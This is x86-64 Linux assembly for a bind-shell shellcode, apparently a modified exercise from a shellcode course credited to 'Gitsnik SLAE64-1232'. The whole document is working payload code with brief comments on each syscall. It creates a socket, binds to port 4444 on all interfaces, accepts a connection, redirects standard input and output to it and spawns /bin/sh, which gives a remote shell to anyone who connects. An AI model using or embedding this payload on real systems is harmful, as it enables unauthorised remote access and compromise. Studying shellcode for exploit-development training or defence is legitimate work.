global _start

;
; Modified by Gitsnik SLAE64-1232
; Modifications expand shell to 133 bytes.
;
_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

	push byte 0x29
	push byte 0x02
	push byte 0x01
	pop rsi
	pop rdi
	pop rax
	cdq
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

	xor rax, rax 

	push rax

	mov dword [rsp-4], eax
	mov word [rsp-6], 0x5c11
	mov byte [rsp-8], 0x2
	sub rsp, 8


	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49
	push byte 0x31
	pop rax
	push byte 0x10
	pop rdx
	
	mov rsi, rsp
	syscall


	; listen(sock, MAX_CLIENTS)
	; syscall number 50
	push byte 0x32
	pop rax
	push byte 0x02
	pop rsi
	syscall


	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43

	push byte 0x2b
	pop rax
	xor rsi, rsi
	cdq
        syscall

	; store the client socket description 
	mov r9, rax 

        ; close parent

	push byte 0x03
	pop rax
        syscall

        ; duplicate sockets

        ; dup2 (new, old)
        mov rdi, r9
	push byte 0x21
	pop rax
	xor rsi, rsi
        syscall

	push byte 0x21
	pop rax
	push byte 0x01
	pop rsi
        syscall

	push byte 0x21
	pop rax
	push byte 0x02
	pop rsi
        syscall



        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
	push byte 0x3b
	pop rax
        syscall
